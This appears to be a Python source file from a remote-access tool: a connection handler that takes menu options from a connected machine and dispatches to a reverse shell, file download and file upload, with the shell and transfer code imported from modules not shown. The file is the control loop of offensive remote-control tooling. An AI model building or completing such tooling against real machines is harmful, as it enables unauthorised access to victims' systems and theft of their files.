from core.utils import display_msg
from core.features.shell import run_reverse_shell
from core.features.filetransfer import download, upload
import time

def connection_handler(client):
    # print("[+] handling connection")
    active_connection = True

    while active_connection:
        option = client.recv()
        
        if option == "1":
            display_msg("Running Reverse Shell")
            run_reverse_shell(client)
        elif option == "2":
            download(client)
        elif option == "3":
            upload(client)

        elif option == "exit" or option == "99" or option == "stop" or option == "quit":
            display_msg("Exiting", "y")
            break
        else:
            display_msg("Invalid option, try again", "r")
            time.sleep(2)

                            

    